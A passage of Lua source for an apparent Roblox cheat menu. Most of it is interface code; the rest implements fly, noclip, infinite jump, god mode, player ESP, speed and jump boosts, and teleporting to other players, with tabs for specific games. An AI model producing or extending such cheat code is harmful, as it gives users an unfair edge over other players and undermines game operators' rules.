local NotifHolder=Instance.new("Frame"); NotifHolder.Size=UDim2.new(0,isMobile and 200 or 240,0,0)
NotifHolder.Position=UDim2.new(1,-(isMobile and 210 or 250),1,-10)
NotifHolder.BackgroundTransparency=1; NotifHolder.AnchorPoint=Vector2.new(0,1); NotifHolder.Parent=ScreenGui
local NHLayout=Instance.new("UIListLayout"); NHLayout.Padding=UDim.new(0,5)
NHLayout.VerticalAlignment=Enum.VerticalAlignment.Bottom; NHLayout.Parent=NotifHolder

local function Notify(title,msg,nType)
	nType=nType or "info"
	local accent=nType=="success" and Color3.fromRGB(40,210,110) or nType=="warn" and Color3.fromRGB(255,185,40) or nType=="error" and Color3.fromRGB(255,70,70) or THEME.ACCENT
	local card=Instance.new("Frame"); card.Size=UDim2.new(1,0,0,isMobile and 60 or 72)
	card.BackgroundColor3=Color3.fromRGB(14,14,24); card.BackgroundTransparency=0.15
	card.BorderSizePixel=0; card.Parent=NotifHolder
	Instance.new("UICorner",card).CornerRadius=UDim.new(0,10)
	local cs=Instance.new("UIStroke"); cs.Color=accent; cs.Thickness=1.2; cs.Transparency=1; cs.Parent=card
	local bar=Instance.new("Frame"); bar.Size=UDim2.new(0,3,0.75,0); bar.Position=UDim2.new(0,0,0.125,0)
	bar.BackgroundColor3=accent; bar.BackgroundTransparency=1; bar.BorderSizePixel=0; bar.Parent=card
	Instance.new("UICorner",bar).CornerRadius=UDim.new(0,4)
	local t1=Instance.new("TextLabel"); t1.Text=title; t1.Size=UDim2.new(1,-14,0,22); t1.Position=UDim2.new(0,10,0,5)
	t1.BackgroundTransparency=1; t1.TextColor3=Color3.fromRGB(255,255,255); t1.TextTransparency=1
	t1.TextXAlignment=Enum.TextXAlignment.Left; t1.Font=Enum.Font.GothamBold; t1.TextSize=TS; t1.Parent=card
	local t2=Instance.new("TextLabel"); t2.Text=msg; t2.Size=UDim2.new(1,-14,0,16); t2.Position=UDim2.new(0,10,0,26)
	t2.BackgroundTransparency=1; t2.TextColor3=Color3.fromRGB(155,145,200); t2.TextTransparency=1
	t2.TextXAlignment=Enum.TextXAlignment.Left; t2.Font=Enum.Font.Gotham; t2.TextSize=TS_SM; t2.Parent=card
	local pbBg=Instance.new("Frame"); pbBg.Size=UDim2.new(1,-12,0,3); pbBg.Position=UDim2.new(0,6,1,-8)
	pbBg.BackgroundColor3=Color3.fromRGB(35,35,55); pbBg.BackgroundTransparency=1; pbBg.BorderSizePixel=0; pbBg.Parent=card
	Instance.new("UICorner",pbBg).CornerRadius=UDim.new(1,0)
	local pbFill=Instance.new("Frame"); pbFill.Size=UDim2.new(1,0,1,0)
	pbFill.BackgroundColor3=accent; pbFill.BorderSizePixel=0; pbFill.Parent=pbBg
	Instance.new("UICorner",pbFill).CornerRadius=UDim.new(1,0)
	for _,o in pairs({card,bar,pbBg}) do tween(o,{BackgroundTransparency=0},0.3) end
	tween(cs,{Transparency=0.3},0.3); tween(t1,{TextTransparency=0},0.3); tween(t2,{TextTransparency=0},0.3)
	task.delay(0.3,function() tween(pbFill,{Size=UDim2.new(0,0,1,0)},3,Enum.EasingStyle.Linear,Enum.EasingDirection.Out) end)
	task.delay(3.3,function()
		for _,o in pairs({card,bar,pbBg}) do tween(o,{BackgroundTransparency=1},0.3) end
		tween(cs,{Transparency=1},0.3); tween(t1,{TextTransparency=1},0.3); tween(t2,{TextTransparency=1},0.3)
		task.wait(0.35); card:Destroy()
	end)
end

-- ═══════════════════════════════════════════
--  TAB SYSTEM
-- ═══════════════════════════════════════════

local tabs={}; local activeTab=nil
local SEARCH_PAD = isMobile and 32 or 38  -- height of search bar

local function createTab(name,icon)
	local btn=Instance.new("TextButton"); btn.Text=""
	btn.Size=UDim2.new(1,0,0,isMobile and 32 or 38)
	btn.BackgroundColor3=THEME.BG_PANEL; btn.BackgroundTransparency=0.2
	btn.BorderSizePixel=0; btn.Parent=Sidebar
	Instance.new("UICorner",btn).CornerRadius=UDim.new(0,8)

	local iconLbl=Instance.new("TextLabel"); iconLbl.Text=icon or ""
	iconLbl.Size=UDim2.new(0,22,1,0); iconLbl.Position=UDim2.new(0,5,0,0)
	iconLbl.BackgroundTransparency=1; iconLbl.TextColor3=THEME.TEXT_DIM
	iconLbl.Font=Enum.Font.Gotham; iconLbl.TextSize=isMobile and 12 or 14; iconLbl.Parent=btn

	local nameLbl=Instance.new("TextLabel"); nameLbl.Text=name
	nameLbl.Size=UDim2.new(1,-28,1,0); nameLbl.Position=UDim2.new(0,26,0,0)
	nameLbl.BackgroundTransparency=1; nameLbl.TextColor3=THEME.TEXT_DIM
	nameLbl.TextXAlignment=Enum.TextXAlignment.Left; nameLbl.Font=Enum.Font.Gotham
	nameLbl.TextSize=TS_SM; nameLbl.TextTruncate=Enum.TextTruncate.AtEnd; nameLbl.Parent=btn

	local pill=Instance.new("Frame"); pill.Size=UDim2.new(0,3,0.5,0); pill.Position=UDim2.new(0,0,0.25,0)
	pill.BackgroundColor3=THEME.ACCENT; pill.Visible=false; pill.BorderSizePixel=0; pill.Parent=btn
	Instance.new("UICorner",pill).CornerRadius=UDim.new(0,4)
	regT(pill,"BackgroundColor3","ACCENT")

	local pageOffY = SEARCH_PAD + 6
	local page=Instance.new("ScrollingFrame"); page.Name=name
	page.Size=UDim2.new(1,-4,1,-pageOffY); page.Position=UDim2.new(0,0,0,pageOffY)
	page.BackgroundTransparency=1; page.ScrollBarThickness=isMobile and 3 or 5
	page.ScrollBarImageColor3=THEME.ACCENT; page.CanvasSize=UDim2.new(0,0,0,0)
	page.AutomaticCanvasSize=Enum.AutomaticSize.Y; page.ScrollingEnabled=true
	page.Visible=false; page.Parent=ContentPanel
	local pl=Instance.new("UIListLayout"); pl.Padding=UDim.new(0,5); pl.Parent=page
	local pp=Instance.new("UIPadding"); pp.PaddingTop=UDim.new(0,4); pp.PaddingBottom=UDim.new(0,16); pp.Parent=page

	local tab={btn=btn,page=page,pill=pill,iconLbl=iconLbl,nameLbl=nameLbl}
	table.insert(tabs,tab)
	regT(btn,"BackgroundColor3","BG_PANEL")
	regT(iconLbl,"TextColor3","TEXT_DIM")
	regT(nameLbl,"TextColor3","TEXT_DIM")

	btn.MouseButton1Click:Connect(function()
		SearchBox.Text=""; SearchPlaceholder.Visible=true
		for _,t in pairs(tabs) do
			t.page.Visible=false; t.pill.Visible=false
			tween(t.btn,{BackgroundTransparency=0.2},0.2)
			tween(t.nameLbl,{TextColor3=THEME.TEXT_DIM},0.2)
			tween(t.iconLbl,{TextColor3=THEME.TEXT_DIM},0.2)
		end
		page.Visible=true; pill.Visible=true
		tween(btn,{BackgroundTransparency=0,BackgroundColor3=THEME.ACCENT_DIM},0.2)
		tween(nameLbl,{TextColor3=THEME.WHITE},0.2)
		tween(iconLbl,{TextColor3=THEME.ACCENT},0.2)
		activeTab=tab
	end)
	return tab
end

-- ═══════════════════════════════════════════
--  UI HELPERS
-- ═══════════════════════════════════════════

local allElements={}
local function regEl(el,name,tabRef) table.insert(allElements,{element=el,name=name:lower(),tabRef=tabRef}) end

local ROW_H = isMobile and 34 or 36
local SLD_H = isMobile and 46 or 50

local function Section(page,text)
	local w=Instance.new("Frame"); w.Size=UDim2.new(1,0,0,22); w.BackgroundTransparency=1; w.Parent=page
	local lbl=Instance.new("TextLabel"); lbl.Text=text; lbl.Size=UDim2.new(0,110,1,0)
	lbl.BackgroundTransparency=1; lbl.TextColor3=THEME.ACCENT; lbl.Font=Enum.Font.GothamBold
	lbl.TextSize=TS_SM; lbl.TextXAlignment=Enum.TextXAlignment.Left; lbl.Parent=w
	regT(lbl,"TextColor3","ACCENT")
	local line=Instance.new("Frame"); line.Size=UDim2.new(1,-116,0,1); line.Position=UDim2.new(0,114,0.5,0)
	line.BackgroundColor3=THEME.STROKE; line.BorderSizePixel=0; line.Parent=w
	local lg=Instance.new("UIGradient")
	lg.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(0,0,0))})
	lg.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)}); lg.Parent=line
end

local function Button(page,text,cb,tabRef)
	local btn=Instance.new("TextButton"); btn.Text=""; btn.Size=UDim2.new(1,0,0,ROW_H)
	btn.BackgroundColor3=THEME.BG_ITEM; btn.BackgroundTransparency=0.05; btn.BorderSizePixel=0; btn.Parent=page
	Instance.new("UICorner",btn).CornerRadius=UDim.new(0,8)
	local bs=Instance.new("UIStroke"); bs.Color=THEME.STROKE; bs.Thickness=1; bs.Transparency=0.4; bs.Parent=btn
	regT(btn,"BackgroundColor3","BG_ITEM"); regT(bs,"Color","STROKE")
	local ab=Instance.new("Frame"); ab.Size=UDim2.new(0,3,0.55,0); ab.Position=UDim2.new(0,0,0.225,0)
	ab.BackgroundColor3=THEME.ACCENT; ab.BackgroundTransparency=1; ab.BorderSizePixel=0; ab.Parent=btn
	Instance.new("UICorner",ab).CornerRadius=UDim.new(0,4)
	local lbl=Instance.new("TextLabel"); lbl.Text="  "..text; lbl.Size=UDim2.new(1,0,1,0)
	lbl.BackgroundTransparency=1; lbl.TextColor3=THEME.TEXT; lbl.TextXAlignment=Enum.TextXAlignment.Left
	lbl.Font=Enum.Font.Gotham; lbl.TextSize=TS; lbl.Parent=btn
	regT(lbl,"TextColor3","TEXT")
	btn.MouseEnter:Connect(function()
		tween(btn,{BackgroundColor3=THEME.ACCENT_DIM,BackgroundTransparency=0},0.18)
		tween(ab,{BackgroundTransparency=0},0.18); tween(bs,{Color=THEME.ACCENT,Transparency=0.2},0.18)
	end)
	btn.MouseLeave:Connect(function()
		tween(btn,{BackgroundColor3=THEME.BG_ITEM,BackgroundTransparency=0.05},0.18)
		tween(ab,{BackgroundTransparency=1},0.18); tween(bs,{Color=THEME.STROKE,Transparency=0.4},0.18)
	end)
	btn.MouseButton1Click:Connect(function()
		tween(btn,{BackgroundColor3=THEME.ACCENT},0.08)
		task.delay(0.12,function() tween(btn,{BackgroundColor3=THEME.ACCENT_DIM},0.18) end)
		pcall(cb)
	end)
	regEl(btn,text,tabRef); return btn
end

local function Toggle(page,text,cb,tabRef)
	local state=false
	local row=Instance.new("Frame"); row.Size=UDim2.new(1,0,0,ROW_H)
	row.BackgroundColor3=THEME.BG_ITEM; row.BackgroundTransparency=0.05; row.BorderSizePixel=0; row.Parent=page
	Instance.new("UICorner",row).CornerRadius=UDim.new(0,8)
	local rs=Instance.new("UIStroke"); rs.Color=THEME.STROKE; rs.Thickness=1; rs.Transparency=0.4; rs.Parent=row
	regT(row,"BackgroundColor3","BG_ITEM"); regT(rs,"Color","STROKE")
	local lbl=Instance.new("TextLabel"); lbl.Text="  "..text; lbl.Size=UDim2.new(1,-62,1,0)
	lbl.BackgroundTransparency=1; lbl.TextColor3=THEME.TEXT; lbl.TextXAlignment=Enum.TextXAlignment.Left
	lbl.Font=Enum.Font.Gotham; lbl.TextSize=TS; lbl.Parent=row
	regT(lbl,"TextColor3","TEXT")
	local track=Instance.new("Frame"); track.Size=UDim2.new(0,36,0,16); track.Position=UDim2.new(1,-44,0.5,-8)
	track.BackgroundColor3=Color3.fromRGB(40,40,62); track.BorderSizePixel=0; track.Parent=row
	Instance.new("UICorner",track).CornerRadius=UDim.new(1,0)
	local knob=Instance.new("Frame"); knob.Size=UDim2.new(0,11,0,11); knob.Position=UDim2.new(0,3,0.5,-6)
	knob.BackgroundColor3=Color3.fromRGB(160,155,200); knob.BorderSizePixel=0; knob.Parent=track
	Instance.new("UICorner",knob).CornerRadius=UDim.new(1,0)
	local hitbox=Instance.new("TextButton"); hitbox.Size=UDim2.new(0,56,1,0); hitbox.Position=UDim2.new(1,-58,0,0)
	hitbox.BackgroundTransparency=1; hitbox.Text=""; hitbox.Parent=row
	hitbox.MouseButton1Click:Connect(function()
		state=not state
		if state then
			tween(track,{BackgroundColor3=THEME.ACCENT},0.2)
			tween(knob,{Position=UDim2.new(0,22,0.5,-6),BackgroundColor3=THEME.WHITE},0.2)
			tween(rs,{Color=THEME.ACCENT,Transparency=0.1},0.2)
		else
			tween(track,{BackgroundColor3=Color3.fromRGB(40,40,62)},0.2)
			tween(knob,{Position=UDim2.new(0,3,0.5,-6),BackgroundColor3=Color3.fromRGB(160,155,200)},0.2)
			tween(rs,{Color=THEME.STROKE,Transparency=0.4},0.2)
		end
		pcall(cb,state)
	end)
	regEl(row,text,tabRef); return row, function() return state end
end

local function Slider(page,text,min,max,default,cb,tabRef)
	local row=Instance.new("Frame"); row.Size=UDim2.new(1,0,0,SLD_H)
	row.BackgroundColor3=THEME.BG_ITEM; row.BackgroundTransparency=0.05; row.BorderSizePixel=0; row.Parent=page
	Instance.new("UICorner",row).CornerRadius=UDim.new(0,8)
	local rs=Instance.new("UIStroke"); rs.Color=THEME.STROKE; rs.Thickness=1; rs.Transparency=0.4; rs.Parent=row
	regT(row,"BackgroundColor3","BG_ITEM"); regT(rs,"Color","STROKE")
	local lbl=Instance.new("TextLabel"); lbl.Text="  "..text; lbl.Size=UDim2.new(0.65,0,0,20)
	lbl.Position=UDim2.new(0,0,0,3); lbl.BackgroundTransparency=1; lbl.TextColor3=THEME.TEXT
	lbl.TextXAlignment=Enum.TextXAlignment.Left; lbl.Font=Enum.Font.Gotham; lbl.TextSize=TS; lbl.Parent=row
	regT(lbl,"TextColor3","TEXT")
	local valLbl=Instance.new("TextLabel"); valLbl.Text=tostring(default); valLbl.Size=UDim2.new(0.35,-8,0,20)
	valLbl.Position=UDim2.new(0.65,0,0,3); valLbl.BackgroundTransparency=1; valLbl.TextColor3=THEME.ACCENT
	valLbl.TextXAlignment=Enum.TextXAlignment.Right; valLbl.Font=Enum.Font.GothamBold; valLbl.TextSize=TS; valLbl.Parent=row
	regT(valLbl,"TextColor3","ACCENT")
	local trackBg=Instance.new("Frame"); trackBg.Size=UDim2.new(1,-16,0,4); trackBg.Position=UDim2.new(0,8,0,SLD_H-14)
	trackBg.BackgroundColor3=Color3.fromRGB(32,32,52); trackBg.BorderSizePixel=0; trackBg.Parent=row
	Instance.new("UICorner",trackBg).CornerRadius=UDim.new(1,0)
	local pct0=(default-min)/(max-min)
	local fill=Instance.new("Frame"); fill.Size=UDim2.new(pct0,0,1,0); fill.BackgroundColor3=THEME.ACCENT; fill.BorderSizePixel=0; fill.Parent=trackBg
	local fg=Instance.new("UIGradient"); fg.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,THEME.ACCENT),ColorSequenceKeypoint.new(1,THEME.ACCENT2)}); fg.Parent=fill
	Instance.new("UICorner",fill).CornerRadius=UDim.new(1,0)
	local knob=Instance.new("Frame"); knob.Size=UDim2.new(0,10,0,10); knob.Position=UDim2.new(pct0,-5,0.5,-5)
	knob.BackgroundColor3=THEME.WHITE; knob.BorderSizePixel=0; knob.Parent=trackBg
	Instance.new("UICorner",knob).CornerRadius=UDim.new(1,0)
	local dragS=false
	local function upd(pos)
		local ap=trackBg.AbsolutePosition; local as=trackBg.AbsoluteSize
		local r=math.clamp((pos.X-ap.X)/as.X,0,1); local v=math.floor(min+r*(max-min))
		valLbl.Text=tostring(v); tween(fill,{Size=UDim2.new(r,0,1,0)},0.05); tween(knob,{Position=UDim2.new(r,-5,0.5,-5)},0.05); pcall(cb,v)
	end
	-- Mouse
	trackBg.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dragS=true; upd(i.Position) end end)
	UserInputService.InputChanged:Connect(function(i) if dragS and i.UserInputType==Enum.UserInputType.MouseMovement then upd(i.Position) end end)
	UserInputService.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dragS=false end end)
	-- Touch
	trackBg.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.Touch then dragS=true; upd(i.Position) end end)
	trackBg.InputChanged:Connect(function(i) if dragS and i.UserInputType==Enum.UserInputType.Touch then upd(i.Position) end end)
	trackBg.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.Touch then dragS=false end end)
	regEl(row,text,tabRef); return row
end

-- ═══════════════════════════════════════════
--  SEARCH LOGIC (current tab only)
-- ═══════════════════════════════════════════

SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
	local q=SearchBox.Text:lower(); SearchPlaceholder.Visible=(q=="")
	for _,t in pairs(tabs) do t.page.Visible=(t==activeTab) end
	if q=="" then
		for _,e in pairs(allElements) do e.element.Visible=true end
	else
		for _,e in pairs(allElements) do
			if e.tabRef==activeTab then
				e.element.Visible=e.name:find(q,1,true)~=nil
			else
				e.element.Visible=true
			end
		end
	end
end)

-- ═══════════════════════════════════════════
--  STATE VARS
-- ═══════════════════════════════════════════

local infiniteJump=false; local noclip=false; local fly=false; local flySpeed=50; local flyConn=nil
local godMode=false; local godConn=nil; local spin=false; local spinBAV=nil
local freeze=false; local freezeConn=nil; local invis=false
local espOn=false; local espHL={}
local dayCycle=false; local dcConn=nil; local rainbow=false; local rbConn=nil
local antiRag=false; local arConn=nil
local origAmb=Lighting.Ambient; local origBright=Lighting.Brightness; local origFog=Lighting.FogEnd

local function startFly()
	local char=LocalPlayer.Character; if not char then return end
	local hum=char:FindFirstChildOfClass("Humanoid"); local root=char:FindFirstChild("HumanoidRootPart")
	if not hum or not root then return end
	hum.PlatformStand=true
	local bv=Instance.new("BodyVelocity"); bv.Velocity=Vector3.zero; bv.MaxForce=Vector3.new(1e5,1e5,1e5); bv.Parent=root
	local bg=Instance.new("BodyGyro"); bg.MaxTorque=Vector3.new(1e5,1e5,1e5); bg.P=1e4; bg.Parent=root
	flyConn=RunService.RenderStepped:Connect(function()
		if not fly then pcall(function() bv:Destroy(); bg:Destroy() end); if hum then hum.PlatformStand=false end; flyConn:Disconnect(); flyConn=nil; return end
		local cam=workspace.CurrentCamera; local dir=Vector3.zero
		if UserInputService:IsKeyDown(Enum.KeyCode.W)           then dir=dir+cam.CFrame.LookVector end
		if UserInputService:IsKeyDown(Enum.KeyCode.S)           then dir=dir-cam.CFrame.LookVector end
		if UserInputService:IsKeyDown(Enum.KeyCode.A)           then dir=dir-cam.CFrame.RightVector end
		if UserInputService:IsKeyDown(Enum.KeyCode.D)           then dir=dir+cam.CFrame.RightVector end
		if UserInputService:IsKeyDown(Enum.KeyCode.Space)       then dir=dir+Vector3.new(0,1,0) end
		if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then dir=dir-Vector3.new(0,1,0) end
		bv.Velocity=dir*flySpeed; bg.CFrame=cam.CFrame
	end)
end

local function refreshESP()
	for _,h in pairs(espHL) do pcall(function() h:Destroy() end) end; espHL={}
	if not espOn then return end
	for _,p in pairs(Players:GetPlayers()) do
		if p~=LocalPlayer and p.Character then
			local h=Instance.new("Highlight"); h.FillColor=THEME.ACCENT; h.OutlineColor=THEME.WHITE
			h.FillTransparency=0.55; h.Adornee=p.Character; h.Parent=p.Character; table.insert(espHL,h)
		end
	end
end

UserInputService.JumpRequest:Connect(function()
	if infiniteJump and LocalPlayer.Character then
		local hum=LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
	end
end)
RunService.Stepped:Connect(function()
	if noclip and LocalPlayer.Character then
		for _,p in pairs(LocalPlayer.Character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=false end end
	end
end)

-- ═══════════════════════════════════════════
--  TABS
-- ═══════════════════════════════════════════

local tabUniversal=createTab("Universal","⚡")
local tabVisual   =createTab("Visual","👁")
local tabPlayer   =createTab("Player","👤")
local tabWorld    =createTab("World","🌍")
local tabSwing    =createTab("Swing Obby","🎮")
local tabSail     =createTab("Sail Obby","⛵")
local tabMM2      =createTab("MM2","🔪")
local tabSettings =createTab("Settings","⚙")
local tabCredits  =createTab("Credits","★")

-- ── UNIVERSAL ────────────────────────────────────────────
Section(tabUniversal.page,"MOVEMENT")
Toggle(tabUniversal.page,"Infinite Jump",function(v) infiniteJump=v; Notify("Infinite Jump",v and "Enabled!" or "Disabled!",v and "success" or "info") end,tabUniversal)
Toggle(tabUniversal.page,"Noclip",function(v)
	noclip=v
	if not v and LocalPlayer.Character then for _,p in pairs(LocalPlayer.Character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=true end end end
	Notify("Noclip",v and "Enabled!" or "Disabled!",v and "success" or "info")
end,tabUniversal)
Toggle(tabUniversal.page,"Fly",function(v) fly=v; if v then startFly() end; Notify("Fly",v and "WASD+Space/Ctrl" or "Disabled!",v and "success" or "info") end,tabUniversal)
Slider(tabUniversal.page,"Fly Speed",10,300,50,function(v) flySpeed=v end,tabUniversal)
Toggle(tabUniversal.page,"Spin",function(v)
	spin=v
	if v then local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		if root then if spinBAV then pcall(function() spinBAV:Destroy() end) end
			local b=Instance.new("BodyAngularVelocity"); b.AngularVelocity=Vector3.new(0,20,0); b.MaxTorque=Vector3.new(0,1e5,0); b.Parent=root; spinBAV=b end
		Notify("Spin","Spinning!","success")
	else if spinBAV then pcall(function() spinBAV:Destroy() end) spinBAV=nil end; Notify("Spin","Stopped!") end
end,tabUniversal)
Toggle(tabUniversal.page,"Freeze",function(v)
	freeze=v
	local root=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if v and root then local bp=Instance.new("BodyPosition"); bp.Position=root.Position; bp.MaxForce=Vector3.new(1e6,1e6,1e6); bp.Parent=root; freezeConn=bp; Notify("Freeze","Frozen!","warn")
	else if freezeConn then pcall(function() freezeConn:Destroy() end) freezeConn=nil end; Notify("Freeze","Unfrozen!") end
end,tabUniversal)
Section(tabUniversal.page,"SPEED")
Slider(tabUniversal.page,"Walk Speed",1,300,16,function(v) local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h then h.WalkSpeed=v end end,tabUniversal)
local function spBtn(l,s) Button(tabUniversal.page,l,function() local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h then h.WalkSpeed=s; Notify("Speed",l.."!") end end,tabUniversal) end
spBtn("Speed x2",32); spBtn("Speed x5",80); spBtn("Speed x10",160); spBtn("Normal Speed",16)
Section(tabUniversal.page,"JUMP")
Slider(tabUniversal.page,"Jump Power",10,500,50,function(v) local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h then h.JumpPower=v end end,tabUniversal)
local function jpBtn(l,p) Button(tabUniversal.page,l,function() local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h then h.JumpPower=p; Notify("Jump",l.."!") end end,tabUniversal) end
jpBtn("High Jump",100); jpBtn("Super Jump",250); jpBtn("Normal Jump",50)

-- ── VISUAL ───────────────────────────────────────────────
Section(tabVisual.page,"LIGHTING")
Toggle(tabVisual.page,"Full Bright",function(v) if v then Lighting.Ambient=Color3.fromRGB(255,255,255); Lighting.Brightness=2; Lighting.ClockTime=14; Lighting.FogEnd=1e6 else Lighting.Ambient=origAmb; Lighting.Brightness=origBright; Lighting.FogEnd=origFog end; Notify("Lighting",v and "Full bright!" or "Restored!",v and "success" or "info") end,tabVisual)
Toggle(tabVisual.page,"No Fog",function(v) Lighting.FogEnd=v and 1e6 or origFog; Notify("Fog",v and "Removed!" or "Restored!") end,tabVisual)
Toggle(tabVisual.page,"Auto Day Cycle",function(v) dayCycle=v; if v then dcConn=RunService.Heartbeat:Connect(function(dt) if dayCycle then Lighting.ClockTime=(Lighting.ClockTime+dt*0.5)%24 end end); Notify("Day Cycle","Running!","success") else if dcConn then dcConn:Disconnect(); dcConn=nil end; Notify("Day Cycle","Stopped!") end end,tabVisual)
Toggle(tabVisual.page,"Rainbow Ambient",function(v) rainbow=v; if v then local h=0; rbConn=RunService.Heartbeat:Connect(function(dt) if rainbow then h=(h+dt*0.1)%1; Lighting.Ambient=Color3.fromHSV(h,0.6,1) end end); Notify("Rainbow","On!","success") else if rbConn then rbConn:Disconnect(); rbConn=nil end; Lighting.Ambient=origAmb; Notify("Rainbow","Off!") end end,tabVisual)
Section(tabVisual.page,"TIME OF DAY")
local function timeBtn(l,t) Button(tabVisual.page,l,function() Lighting.ClockTime=t; Notify("Time",l.."!") end,tabVisual) end
timeBtn("☀ Sunrise",6); timeBtn("🌤 Midday",14); timeBtn("🌆 Sunset",19); timeBtn("🌙 Midnight",0)
Section(tabVisual.page,"CAMERA")
Slider(tabVisual.page,"Field of View",30,120,70,function(v) workspace.CurrentCamera.FieldOfView=v end,tabVisual)
local function fovBtn(l,f) Button(tabVisual.page,l,function() workspace.CurrentCamera.FieldOfView=f; Notify("FOV",tostring(f).."!") end,tabVisual) end
fovBtn("Normal (70)",70); fovBtn("Wide (100)",100); fovBtn("Zoomed (40)",40)

-- ── PLAYER ───────────────────────────────────────────────
Section(tabPlayer.page,"HEALTH")
Toggle(tabPlayer.page,"God Mode",function(v) godMode=v; if godConn then godConn:Disconnect(); godConn=nil end; if v then godConn=RunService.Heartbeat:Connect(function() if godMode and LocalPlayer.Character then local h=LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h then h.Health=h.MaxHealth end end end); Notify("God Mode","Invincible!","success") else Notify("God Mode","Disabled!") end end,tabPlayer)
Button(tabPlayer.page,"Full Heal",function() local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h then h.Health=h.MaxHealth; Notify("Health","Healed!","success") end end,tabPlayer)
Button(tabPlayer.page,"Reset Character",function() local h=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h then h.Health=0; Notify("Player","Reset!","warn") end end,tabPlayer)
Section(tabPlayer.page,"CHARACTER")
Toggle(tabPlayer.page,"Anti Ragdoll",function(v) antiRag=v; if arConn then arConn:Disconnect(); arConn=nil end; if v then arConn=RunService.Heartbeat:Connect(function() if antiRag and LocalPlayer.Character then local h=LocalPlayer.Character:FindFirstChildOfClass("Humanoid"); if h then h:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false); h:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false) end end end); Notify("Anti Ragdoll","Enabled!","success") else Notify("Anti Ragdoll","Disabled!") end end,tabPlayer)
Toggle(tabPlayer.page,"Invisible",function(v) invis=v; local c=LocalPlayer.Character; if not c then return end; for _,p in pairs(c:GetDescendants()) do if p:IsA("BasePart") or p:IsA("Decal") then p.LocalTransparencyModifier=v and 1 or 0 end end; Notify("Invisible",v and "Invisible!" or "Visible!",v and "success" or "info") end,tabPlayer)
local function sizeBtn(l,s) Button(tabPlayer.page,l,function() local c=LocalPlayer.Character; if c then pcall(function() c:ScaleTo(s) end); Notify("Size",l.."!") end end,tabPlayer) end
sizeBtn("Giant (x3)",3); sizeBtn("Tiny (x0.5)",0.5); sizeBtn("Normal Size",1)
Section(tabPlayer.page,"ESP")
Toggle(tabPlayer.page,"Player ESP",function(v) espOn=v; refreshESP(); Notify("ESP",v and "Enabled!" or "Disabled!",v and "success" or "info") end,tabPlayer)
Button(tabPlayer.page,"Refresh ESP",function() if espOn then refreshESP(); Notify("ESP","Refreshed!") end end,tabPlayer)
Section(tabPlayer.page,"TELEPORT")
do
	local row=Instance.new("Frame"); row.Size=UDim2.new(1,0,0,ROW_H); row.BackgroundColor3=THEME.BG_ITEM; row.BackgroundTransparency=0.05; row.BorderSizePixel=0; row.Parent=tabPlayer.page
	Instance.new("UICorner",row).CornerRadius=UDim.new(0,8)
	local rs2=Instance.new("UIStroke"); rs2.Color=THEME.STROKE; rs2.Thickness=1; rs2.Transparency=0.4; rs2.Parent=row
	regT(row,"BackgroundColor3","BG_ITEM"); regT(rs2,"Color","STROKE")
	local lbl2=Instance.new("TextLabel"); lbl2.Text="  To:"; lbl2.Size=UDim2.new(0.25,0,1,0); lbl2.BackgroundTransparency=1; lbl2.TextColor3=THEME.TEXT; lbl2.TextXAlignment=Enum.TextXAlignment.Left; lbl2.Font=Enum.Font.Gotham; lbl2.TextSize=TS; lbl2.Parent=row
	local box2=Instance.new("TextBox"); box2.PlaceholderText="Username..."; box2.Size=UDim2.new(0.45,0,0.7,0); box2.Position=UDim2.new(0.27,0,0.15,0); box2.BackgroundColor3=Color3.fromRGB(30,30,50); box2.TextColor3=THEME.WHITE; box2.PlaceholderColor3=THEME.TEXT_MUTED; box2.Font=Enum.Font.Gotham; box2.TextSize=TS_SM; box2.ClearTextOnFocus=false; box2.Parent=row
	Instance.new("UICorner",box2).CornerRadius=UDim.new(0,6)
	local goBtn=Instance.new("TextButton"); goBtn.Text="Go"; goBtn.Size=UDim2.new(0.2,0,0.7,0); goBtn.Position=UDim2.new(0.78,0,0.15,0); goBtn.BackgroundColor3=THEME.ACCENT; goBtn.TextColor3=THEME.BTN_TEXT; goBtn.Font=Enum.Font.GothamBold; goBtn.TextSize=TS; goBtn.BorderSizePixel=0; goBtn.Parent=row
	Instance.new("UICorner",goBtn).CornerRadius=UDim.new(0,6)
	goBtn.MouseButton1Click:Connect(function()
		local t=Players:FindFirstChild(box2.Text)
		if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") then local r=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart"); if r then r.CFrame=t.Character.HumanoidRootPart.CFrame+Vector3.new(0,3,0); Notify("Teleport","Teleported!","success") end
		else Notify("Teleport","Not found!","error") end
	end)
	regEl(row,"teleport to player",tabPlayer)
end
Button(tabPlayer.page,"Rejoin Server",function() Notify("Server","Rejoining...","warn"); task.wait(1); pcall(function() TeleportService:Teleport(game.PlaceId,LocalPlayer) end) end,tabPlayer)

-- ── WORLD ────────────────────────────────────────────────
Section(tabWorld.page,"GRAVITY")
